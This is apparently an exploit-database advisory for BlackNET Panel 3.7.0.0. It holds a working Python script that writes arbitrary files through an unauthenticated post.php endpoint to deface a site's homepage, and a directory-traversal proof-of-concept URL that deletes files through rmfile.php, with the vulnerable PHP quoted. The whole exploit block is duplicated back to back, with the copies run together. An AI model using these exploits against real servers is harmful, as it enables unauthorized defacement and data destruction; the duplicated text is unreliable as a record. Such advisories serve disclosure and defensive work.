

Type: Missing Authentication / File Deletion / Traversal Exploit 

Vuln: http://localhost/x/BlackNET/BlackNET%20Panel/rmfile.php?fname=../favico.png&vicid=&csrf=95a6ae14d491e482b4370da1fd74f69891058f12472e6510e373889d99d84c3c

Author: bRpsd

```
# Exploit Title: BlackNET - Multiple Vulnerabilities
# Exploit Author: bRpsd
# Date: 20/09/2024
# Vendor Homepage: https://github.com/AndroVirus
# Software Link: https://github.com/AndroVirus/BlackNET/
# Version: v3.7.0.0
# Tested on: MacOS - Xampp
# CVE: NA
import requests

# Define the target URL for the POST request
post_url = "http://localhost/x/BlackNET/BlackNET%20Panel/post.php"

# Defaces the homepage
payload = "Nothing to see here."
data = {
    'folder_name': 'www',  # this can create any folder on the server
    'file_name': 'index.html',  # Name of the file to be created
    'data': payload  # The payload being tested
}

# Send the POST request
response = requests.post(post_url, data=data)

# Check the response
if response.status_code == 200:
    print("Request successful. Check if 'file' was created.")
else:
    print(f"Request failed with status code: {response.status_code}")
    
# Vulnerable code: /BlackNET/BlackNET%20Panel/post.php
# header('Content-type: text/html; charset=utf-8');
#
# require_once 'config/config.php';
# require_once APP_PATH . 'classes/POST.php';
#
# if ($_SERVER['REQUEST_METHOD'] == "POST") {
#  $POST = new BlackNET\POST();
# $folder_name = isset($_POST['folder_name']) && $_POST['folder_name'] != "" ? $_POST['folder_name'] : 'www';
#    $file_name = isset($_POST['file_name']) ? $_POST['file_name'] : "unknown.txt";
#
#   $data = $POST->sanitize($_POST['data']);
#
#  $POST->prepare($folder_name, $file_name, $data);
#
# $POST->write();   
#
###########################################################################################
# Arbitrary File Deletion & Directory Traversal [Authenticated]
# File: rmfile.php
# Parameter: fname
# Vul Code:
#<?php
# require_once 'session.php';

#$msg = "";
#$id = "";
#if ($_SERVER['REQUEST_METHOD'] == "POST") {
#    $files = $_POST['file'];
#    $vicid = $utils->sanitize($_POST['vicid']);
#    if ($auth->checkToken($_POST['csrf'], $_SESSION['csrf'])) {
#        foreach ($files as $file) {
#if (strpos($file, "../")) {
#                $id = $vicid;
#                $msg = "error";
#            }
#            $filename = $utils->sanitize($file);
#            $real_path = realpath("upload" . "/" . $vicid . "/" . $filename);
#            if (file_exists($real_path)) {
#                unlink($real_path);
#
#
# Proof Of Concept:
# http://localhost/x/BlackNET/BlackNET%20Panel/rmfile.php?fname=../favico.png&vicid=&csrf=95a6ae14d491e482b4370da1fd74f69891058f12472e6510e373889d99d84c3c# Exploit Title: BlackNET - Multiple Vulnerabilities
# Exploit Author: bRpsd
# Date: 20/09/2024
# Vendor Homepage: https://github.com/AndroVirus
# Software Link: https://github.com/AndroVirus/BlackNET/
# Version: v3.7.0.0
# Tested on: MacOS - Xampp
# CVE: NA
import requests

# Define the target URL for the POST request
post_url = "http://localhost/x/BlackNET/BlackNET%20Panel/post.php"

# Defaces the homepage
payload = "Nothing to see here."
data = {
    'folder_name': 'www',  # this can create any folder on the server
    'file_name': 'index.html',  # Name of the file to be created
    'data': payload  # The payload being tested
}

# Send the POST request
response = requests.post(post_url, data=data)

# Check the response
if response.status_code == 200:
    print("Request successful. Check if 'file' was created.")
else:
    print(f"Request failed with status code: {response.status_code}")
    
# Vulnerable code: /BlackNET/BlackNET%20Panel/post.php
# header('Content-type: text/html; charset=utf-8');
#
# require_once 'config/config.php';
# require_once APP_PATH . 'classes/POST.php';
#
# if ($_SERVER['REQUEST_METHOD'] == "POST") {
#  $POST = new BlackNET\POST();
# $folder_name = isset($_POST['folder_name']) && $_POST['folder_name'] != "" ? $_POST['folder_name'] : 'www';
#    $file_name = isset($_POST['file_name']) ? $_POST['file_name'] : "unknown.txt";
#
#   $data = $POST->sanitize($_POST['data']);
#
#  $POST->prepare($folder_name, $file_name, $data);
#
# $POST->write();   
#
###########################################################################################
# Arbitrary File Deletion & Directory Traversal [Authenticated]
# File: rmfile.php
# Parameter: fname
# Vul Code:
#<?php
# require_once 'session.php';

#$msg = "";
#$id = "";
#if ($_SERVER['REQUEST_METHOD'] == "POST") {
#    $files = $_POST['file'];
#    $vicid = $utils->sanitize($_POST['vicid']);
#    if ($auth->checkToken($_POST['csrf'], $_SESSION['csrf'])) {
#        foreach ($files as $file) {
#if (strpos($file, "../")) {
#                $id = $vicid;
#                $msg = "error";
#            }
#            $filename = $utils->sanitize($file);
#            $real_path = realpath("upload" . "/" . $vicid . "/" . $filename);
#            if (file_exists($real_path)) {
#                unlink($real_path);
#
#
# Proof Of Concept:
# http://localhost/x/BlackNET/BlackNET%20Panel/rmfile.php?fname=../favico.png&vicid=&csrf=95a6ae14d491e482b4370da1fd74f69891058f12472e6510e373889d99d84c3c
```

**Reference:** https://packetstormsecurity.com/files/181696/BlackNET-3.7.0.0-Missing-Authentication-File-Deletion-Traversal.html
